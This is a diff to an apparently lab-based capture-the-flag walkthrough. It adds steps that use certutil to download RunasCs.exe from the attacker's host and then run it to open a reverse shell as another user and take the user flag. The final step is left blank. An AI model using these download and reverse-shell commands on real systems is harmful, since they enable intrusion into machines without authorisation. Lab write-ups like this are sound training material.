@@ -120,7 +120,19 @@
 
 <img width="521" height="128" alt="image" src="https://github.com/user-attachments/assets/c4862cde-ab09-422c-aa92-318fe4344593" />
 
-18. Now, we have a foothold on the machine!
+18. Now, we have a foothold on the machine! We will transfer over the RunasCs.exe file to the victim host so that we can run commands as C.Bum. 
+
+`certutil -urlcache -f http://10.10.14.226:8000/RunasCs.exe runas.exe`
+
+19. Then, run the script to get a remote shell as C.Bum and grab the user flag!
+
+`runas.exe c.bum [PASS] -r 10.10.14.226:1234 cmd`
+
+<img width="523" height="446" alt="image" src="https://github.com/user-attachments/assets/c4ef4a15-cb0f-4beb-9ed0-3cb30128fe04" />
+
+20. 
+
+
 
 
 
